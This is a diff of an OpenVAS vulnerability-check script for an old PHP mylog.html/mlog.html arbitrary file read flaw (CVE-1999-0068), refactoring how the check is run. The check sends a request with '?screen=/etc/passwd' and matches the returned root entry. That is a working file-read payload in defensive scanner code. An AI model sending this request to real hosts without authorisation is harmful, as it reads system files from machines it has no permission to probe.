@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: php_arbitrary_file_access.nasl 3362 2016-05-20 11:19:10Z antu123 $
+# $Id: php_arbitrary_file_access.nasl 5781 2017-03-30 08:15:57Z cfi $
 # Description: PHP mylog.html/mlog.html read arbitrary file
 #
 # Authors:
@@ -35,31 +35,21 @@ to view arbitrary files on the remote host.";
 if(description)
 {
  script_id(15708);
- script_version("$Revision: 3362 $");
- script_tag(name:"last_modification", value:"$Date: 2016-05-20 13:19:10 +0200 (Fri, 20 May 2016) $");
+ script_version("$Revision: 5781 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-30 10:15:57 +0200 (Thu, 30 Mar 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(713);  
  script_cve_id("CVE-1999-0068");
  script_xref(name:"OSVDB", value:"3396");
  script_xref(name:"OSVDB", value:"3397");
- 
- name = "PHP mylog.html/mlog.html read arbitrary file";
-
- script_name(name);
+ script_name("PHP mylog.html/mlog.html read arbitrary file");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-
- summary = "Checks PHP mylog.html/mlog.html arbitrary file access";
-
- script_summary(summary);
- 
- script_category(ACT_GATHER_INFO);
-  script_tag(name:"qod_type", value:"remote_vul");
- 
+ script_category(ACT_ATTACK);
+ script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
  script_family("Web application abuses");
- 
- script_dependencies("http_version.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "summary" , value : tag_summary);
@@ -71,20 +61,21 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-if ( ! port ) exit(0);
 
-foreach dir ( make_list(cgi_dirs(), "/php") )
-{
-	foreach htmlfile (make_list("/mylog.html", "/mlog.html"))
-	{
-	  req = http_get(port:port, item:dir + htmlfile + "?screen=/etc/passwd");
- 	  res = http_keepalive_send_recv(port:port, data:req);
- 	  if ( res == NULL ) 
-		exit(0);
- 	  if ( egrep( pattern:"root:.*:0:[01]:.*", string:res) )
-	  {
-	 	security_message(port);
-	 	exit(0);
-	  }
-	 }
+foreach dir( make_list_unique( "/php", cgi_dirs( port:port ) ) ) {
+
+  if( dir == "/" ) dir = "";
+
+  foreach htmlfile( make_list( "/mylog.html", "/mlog.html" ) ) {
+
+    url = dir + htmlfile + "?screen=/etc/passwd";
+
+    if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:.*")) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
+  }
 }
+
+exit( 99 );
